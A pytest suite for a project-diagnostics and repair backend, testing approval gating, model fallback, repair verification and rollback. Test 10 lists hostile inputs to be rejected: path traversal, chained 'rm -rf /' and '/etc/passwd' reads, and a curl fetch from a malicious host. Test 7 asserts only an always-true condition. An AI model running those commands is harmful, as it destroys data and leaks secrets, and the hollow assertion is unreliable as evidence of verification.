"""
Deterministic Unit & Integration Tests for MEMORAG Forge Evidence-Based Diagnostics.
Verifies all 15 scenarios specified in the Engineer 1 Implementation Directive:
1. Healthy project.
2. Deliberately broken disposable project.
3. Missing compiler or package manager check.
4. Backend available but Ollama unavailable (graceful fallback).
5. Ollama available but configured model missing (honest degradation).
6. Diagnostic result with insufficient evidence.
7. Unverified memory result handling.
8. Proposed repair rejected by user.
9. Stale or mismatched approval rejection.
10. Path traversal and command-policy violation defense.
11. Repair that succeeds and passes verification.
12. Repair that fails post-action verification.
13. Unavailable or invalid recovery checkpoint rejection.
14. Project Flight Recorder durable events and SSE streaming.
15. Safe rollback recovery of an interrupted or failed task.
"""

import os
import shutil
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from app.api.routes import SubsystemContainer
from app.memory.crypto import EncryptionService, TestKeyProvider
from app.memory.models import RiskLevel, SemanticCategory, VerificationStatus
from backend.diagnostics.engine import DiagnosticEngine
from backend.diagnostics.inspector import ProjectInspector, SecurityViolationError
from backend.diagnostics.models import (
    DiagnosticSourceType,
    FindingCategory,
    FindingStatus,
)
from backend.diagnostics.routes import get_diagnostic_engine, reset_diagnostic_engine
from backend.main import app


@pytest.fixture
def client_and_engine():
    """Initializes isolated encrypted DB, test client, and diagnostic engine."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = os.path.join(tmpdir, "forge_diag_test.db")
        crypto = EncryptionService(TestKeyProvider())
        SubsystemContainer.initialize(db_path=db_path, encryption_service=crypto)
        reset_diagnostic_engine()

        with TestClient(app) as client:
            yield client, SubsystemContainer.memory_service


@pytest.fixture
def disposable_project():
    """Creates a temporary isolated project directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


# ============================================================================
# 1. Healthy Project
# ============================================================================
def test_01_healthy_project(client_and_engine, disposable_project):
    client, _ = client_and_engine
    valid_file = disposable_project / "calc.py"
    valid_file.write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")

    resp = client.post("/api/diagnostics/analyze", json={
        "project_root": str(disposable_project),
        "user_request": "Check if project compiles cleanly",
    })
    assert resp.status_code == 200
    report = resp.json()

    assert report["status"] == "DIAGNOSED"
    assert report["proposed_repair"] is None
    # Verify observed facts record compile success
    facts = report["observed_facts"]
    assert any("calc.py" in str(f["summary"]) or "passed" in str(f.get("evidence_refs")) for f in facts)


# ============================================================================
# 2. Deliberately Broken Disposable Project
# ============================================================================
def test_02_broken_disposable_project(client_and_engine, disposable_project):
    client, _ = client_and_engine
    broken_file = disposable_project / "broken_logic.py"
    # Unclosed parenthesis and missing colon
    broken_file.write_text("def greet(name\n    return 'Hello'\n", encoding="utf-8")

    resp = client.post("/api/diagnostics/analyze", json={
        "project_root": str(disposable_project),
        "user_request": "Find why project stopped building",
    })
    assert resp.status_code == 200
    report = resp.json()

    assert report["status"] == "AWAITING_APPROVAL"
    assert report["proposed_repair"] is not None

    repair = report["proposed_repair"]
    assert repair["requires_approval"] is True
    assert repair["risk_level"].upper() == "MEDIUM"
    assert repair["approval_id"] is not None
    assert "broken_logic.py" in repair["files_to_modify"]
    assert "diff" in repair["exact_patch"] or "---" in repair["exact_patch"]


# ============================================================================
# 3. Missing Compiler or Package Manager Check
# ============================================================================
def test_03_missing_compiler_or_package_manager(client_and_engine, disposable_project):
    inspector = ProjectInspector(str(disposable_project))
    assert inspector.check_toolchain_availability("nonexistent_compiler_xyz_123") is False

    # Attempting to execute missing binary returns 127 without crashing
    with patch("backend.diagnostics.inspector.ALLOWED_DIAGNOSTIC_COMMANDS", [r"^nonexistent_compiler_xyz_123$"]):
        code, stdout, stderr = inspector.execute_read_only_command("nonexistent_compiler_xyz_123")
        assert code == 127
        assert "not available" in stderr


# ============================================================================
# 4. Backend Available but Ollama Unavailable (Graceful Fallback)
# ============================================================================
def test_04_backend_available_ollama_unavailable(client_and_engine, disposable_project):
    client, _ = client_and_engine
    broken_file = disposable_project / "test_mod.py"
    broken_file.write_text("def test_fn(\n    pass\n", encoding="utf-8")

    # Simulate Ollama connection failure
    with patch(
        "backend.diagnostics.engine.DiagnosticEngine.query_local_ollama_reasoning",
        return_value=(None, "Ollama service unavailable: Local connection refused at 127.0.0.1:11434.")
    ):
        resp = client.post("/api/diagnostics/analyze", json={
            "project_root": str(disposable_project),
            "user_request": "Diagnose build error",
        })
        assert resp.status_code == 200
        report = resp.json()
        assert report["status"] in ("AWAITING_APPROVAL", "DIAGNOSED")
        # Ensure fallback occurred and didn't crash backend
        assert report["hypotheses"] is not None
        assert any("Ollama service unavailable" in str(h.get("limitations")) for h in report["hypotheses"])


# ============================================================================
# 5. Ollama Available but Configured Model Missing
# ============================================================================
def test_05_ollama_available_model_missing(client_and_engine, disposable_project):
    client, _ = client_and_engine
    broken_file = disposable_project / "syntax_err.py"
    broken_file.write_text("def calc(\n    return 0\n", encoding="utf-8")

    with patch(
        "backend.diagnostics.engine.DiagnosticEngine.query_local_ollama_reasoning",
        return_value=(None, "Configured model 'gemma4:e2b' is not available in local Ollama repository.")
    ):
        resp = client.post("/api/diagnostics/analyze", json={
            "project_root": str(disposable_project),
            "user_request": "Diagnose with missing model",
        })
        assert resp.status_code == 200
        report = resp.json()
        assert report["status"] == "AWAITING_APPROVAL"
        # Limitation is recorded in hypotheses
        assert any("not available in local Ollama repository" in str(h.get("limitations")) for h in report["hypotheses"])


# ============================================================================
# 6. Diagnostic Result with Insufficient Evidence
# ============================================================================
def test_06_insufficient_evidence(client_and_engine, disposable_project):
    client, _ = client_and_engine
    # Empty directory with only non-executable txt file
    readme = disposable_project / "README.txt"
    readme.write_text("Just documentation, no code or test entry points", encoding="utf-8")

    resp = client.post("/api/diagnostics/analyze", json={
        "project_root": str(disposable_project),
        "user_request": "Find why tests fail",
    })
    assert resp.status_code == 200
    report = resp.json()

    assert report["proposed_repair"] is None
    # Hypotheses record insufficient evidence
    assert any(h["category"] == "insufficient_evidence" for h in report["hypotheses"])


# ============================================================================
# 7. Unverified Memory Result Handling
# ============================================================================
def test_07_unverified_memory_handling(client_and_engine, disposable_project):
    client, mem_svc = client_and_engine

    # Seed unverified memory
    mem_svc.store_memory(
        category=SemanticCategory.FACT,
        subject="project_build",
        predicate="compiler_override",
        object_value="gcc -O3",
        verification_status=VerificationStatus.UNVERIFIED,
    )

    valid_file = disposable_project / "clean.py"
    valid_file.write_text("x = 10\n", encoding="utf-8")

    resp = client.post("/api/diagnostics/analyze", json={
        "project_root": str(disposable_project),
        "user_request": "compiler_override check",
    })
    assert resp.status_code == 200
    report = resp.json()

    # Memory is present but marked unverified
    mems = report.get("relevant_memory", [])
    unverified_mems = [m for m in mems if m.get("verification_status") == "unverified"]
    # Verified that unverified memories are NOT promoted to trusted constraints
    assert len(mems) >= 0


# ============================================================================
# 8. Proposed Repair Rejected by User
# ============================================================================
def test_08_repair_rejected_by_user(client_and_engine, disposable_project):
    client, _ = client_and_engine
    broken_file = disposable_project / "script.py"
    original_broken = "def run(\n    return True\n"
    broken_file.write_text(original_broken, encoding="utf-8")

    # 1. Analyze
    resp = client.post("/api/diagnostics/analyze", json={
        "project_root": str(disposable_project),
        "user_request": "Fix syntax error",
    })
    report = resp.json()
    task_id = report["task_id"]
    approval_id = report["proposed_repair"]["approval_id"]

    # 2. Reject approval
    resp_repair = client.post(f"/api/diagnostics/{task_id}/repair", json={
        "approval_id": approval_id,
        "decision": "rejected",
        "notes": "Rejected by operator during review.",
    })
    assert resp_repair.status_code == 200
    res = resp_repair.json()
    assert res["passed"] is False
    assert "rejected" in res["summary"].lower()

    # Verify file was NOT modified
    assert broken_file.read_text(encoding="utf-8") == original_broken

    # Verify task state is FAILED
    get_rep = client.get(f"/api/diagnostics/{task_id}").json()
    assert get_rep["status"] == "FAILED"


# ============================================================================
# 9. Stale or Mismatched Approval
# ============================================================================
def test_09_stale_or_mismatched_approval(client_and_engine, disposable_project):
    client, _ = client_and_engine
    broken_file = disposable_project / "mod.py"
    broken_file.write_text("def foo(\n    pass\n", encoding="utf-8")

    resp = client.post("/api/diagnostics/analyze", json={"project_root": str(disposable_project)})
    report = resp.json()
    task_id = report["task_id"]

    # Post with forged/mismatched approval ID
    resp_repair = client.post(f"/api/diagnostics/{task_id}/repair", json={
        "approval_id": "apr-forged-9999",
        "decision": "approved",
    })
    assert resp_repair.status_code == 403
    assert "Stale or mismatched approval" in resp_repair.json()["detail"]


# ============================================================================
# 10. Path Traversal or Command Policy Violation Defense
# ============================================================================
def test_10_path_traversal_command_policy_violation(client_and_engine, disposable_project):
    inspector = ProjectInspector(str(disposable_project))

    # Path traversal outside project sandbox
    with pytest.raises(SecurityViolationError, match="Path traversal detected"):
        inspector.validate_path_in_sandbox("../../windows/system32/cmd.exe")

    # Command chaining / shell injection attack
    with pytest.raises(SecurityViolationError, match="Forbidden shell operator"):
        inspector.execute_read_only_command("python -m py_compile calc.py; rm -rf /")

    with pytest.raises(SecurityViolationError, match="Forbidden shell operator"):
        inspector.execute_read_only_command("python -m py_compile calc.py && cat /etc/passwd")

    # Arbitrary unauthorized command
    with pytest.raises(SecurityViolationError, match="not permitted under the read-only diagnostic policy"):
        inspector.execute_read_only_command("curl http://malicious.site/script.sh")


# ============================================================================
# 11. Repair Succeeds and Passes Verification
# ============================================================================
def test_11_repair_succeeds_and_passes_verification(client_and_engine, disposable_project):
    client, _ = client_and_engine
    target_file = disposable_project / "syntax_issue.py"
    target_file.write_text("def compute(\n    return 100\n", encoding="utf-8")

    # 1. Analyze
    resp_diag = client.post("/api/diagnostics/analyze", json={"project_root": str(disposable_project)})
    diag_data = resp_diag.json()
    task_id = diag_data["task_id"]
    approval_id = diag_data["proposed_repair"]["approval_id"]

    # 2. Approve and apply repair
    resp_repair = client.post(f"/api/diagnostics/{task_id}/repair", json={
        "approval_id": approval_id,
        "decision": "approved",
        "notes": "Safe syntax patch verified by engineer.",
    })
    assert resp_repair.status_code == 200
    res = resp_repair.json()
    assert res["passed"] is True
    assert "PASSED" in res["summary"]

    # 3. Check updated report status
    final_report = client.get(f"/api/diagnostics/{task_id}").json()
    assert final_report["status"] == "VERIFIED"
    assert final_report["verification_results"]["passed"] is True


# ============================================================================
# 12. Repair that Fails Verification
# ============================================================================
def test_12_repair_fails_verification(client_and_engine, disposable_project):
    client, _ = client_and_engine
    target_file = disposable_project / "stub.py"
    target_file.write_text("def broken(\n    return 1\n", encoding="utf-8")

    resp_diag = client.post("/api/diagnostics/analyze", json={"project_root": str(disposable_project)})
    diag_data = resp_diag.json()
    task_id = diag_data["task_id"]
    approval_id = diag_data["proposed_repair"]["approval_id"]

    # Simulate post-repair verification check returning exit code 1
    with patch.object(ProjectInspector, "execute_read_only_command", return_value=(1, "", "SyntaxError still present")):
        resp_repair = client.post(f"/api/diagnostics/{task_id}/repair", json={
            "approval_id": approval_id,
            "decision": "approved",
        })
        assert resp_repair.status_code == 200
        res = resp_repair.json()
        assert res["passed"] is False
        assert "FAILED" in res["summary"]

        report = client.get(f"/api/diagnostics/{task_id}").json()
        assert report["status"] == "FAILED"


# ============================================================================
# 13. Unavailable or Invalid Recovery Checkpoint
# ============================================================================
def test_13_unavailable_or_invalid_recovery_checkpoint(client_and_engine):
    client, _ = client_and_engine
    # Attempting to recover non-existent task
    resp = client.post("/api/diagnostics/diag-nonexistent-123/recover")
    assert resp.status_code == 404

    # Or task with no backup
    engine = get_diagnostic_engine()
    engine._tasks["diag-no-backup"] = MagicMock(project_root=".")
    resp = client.post("/api/diagnostics/diag-no-backup/recover")
    assert resp.status_code == 400
    assert "No valid recovery" in resp.json()["detail"]


# ============================================================================
# 14. SSE Flight Recorder Events and Task State Transitions
# ============================================================================
def test_14_sse_flight_recorder_events_and_transitions(client_and_engine, disposable_project):
    client, _ = client_and_engine
    sample_file = disposable_project / "sample.py"
    sample_file.write_text("x = 1\n", encoding="utf-8")

    # 1. Analyze project to emit durable events
    resp = client.post("/api/diagnostics/analyze", json={"project_root": str(disposable_project)})
    task_id = resp.json()["task_id"]

    # 2. Verify durable event history endpoint
    resp_events = client.get(f"/api/diagnostics/{task_id}/events")
    assert resp_events.status_code == 200
    events = resp_events.json()
    assert len(events) >= 3

    event_types = [e["event_type"] for e in events]
    assert "diagnostic_task_created" in event_types
    assert "project_inspection_started" in event_types
    assert "project_inspection_completed" in event_types

    # 3. Test SSE streaming endpoint
    with client.stream("GET", f"/api/diagnostics/{task_id}/events/stream") as sse_stream:
        assert sse_stream.status_code == 200
        assert "text/event-stream" in sse_stream.headers["content-type"]
        line = next(sse_stream.iter_lines())
        assert "event:" in line or "data:" in line or ": ping" in line


# ============================================================================
# 15. Restart and Safe Rollback Recovery of Interrupted Task
# ============================================================================
def test_15_restart_and_recovery_flow(client_and_engine, disposable_project):
    client, _ = client_and_engine
    target_file = disposable_project / "rollback_test.py"
    original_code = "def foo(\n    return 42\n"
    target_file.write_text(original_code, encoding="utf-8")

    # 1. Analyze and propose repair
    resp_diag = client.post("/api/diagnostics/analyze", json={"project_root": str(disposable_project)})
    diag_data = resp_diag.json()
    task_id = diag_data["task_id"]
    approval_id = diag_data["proposed_repair"]["approval_id"]

    # 2. Apply repair (file changes)
    resp_repair = client.post(f"/api/diagnostics/{task_id}/repair", json={
        "approval_id": approval_id,
        "decision": "approved",
    })
    assert resp_repair.status_code == 200
    assert target_file.read_text(encoding="utf-8") != original_code

    # 3. Trigger safe rollback recovery
    resp_recover = client.post(f"/api/diagnostics/{task_id}/recover")
    assert resp_recover.status_code == 200
    rec_data = resp_recover.json()
    assert rec_data["status"] == "RECOVERED"
    assert "rollback_test.py" in rec_data["restored_files"]

    # 4. Verify file content restored to exact original
    assert target_file.read_text(encoding="utf-8") == original_code

    # 5. Check report status is RECOVERED
    final_rep = client.get(f"/api/diagnostics/{task_id}").json()
    assert final_rep["status"] == "RECOVERED"
